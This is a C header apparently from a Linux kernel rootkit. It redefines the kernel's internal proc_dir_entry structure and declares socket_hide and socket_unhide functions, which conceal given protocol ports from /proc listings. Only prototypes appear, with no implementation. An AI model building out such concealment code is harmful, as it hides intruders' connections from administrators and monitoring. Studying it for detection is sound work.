#ifndef SOCKET_H
#define SOCKET_H

#include <linux/proc_fs.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/rbtree.h>
#include <linux/inet_diag.h>

/* struct for /proc/<pid> entries */
struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	struct proc_dir_entry *parent;
	struct rb_root subdir;
	struct rb_node subdir_node;
	void *data;
	atomic_t count;
	atomic_t in_use;
	struct completion *pde_unload_completion;
	struct list_head pde_openers;
	spinlock_t pde_unload_lock;
	u8 namelen;
	char name[];
};

void socket_hide(char *protocol, int port);
void socket_unhide(char *protocol, int port);

int socket_hiding_init(void);
void socket_hiding_exit(void);

#endif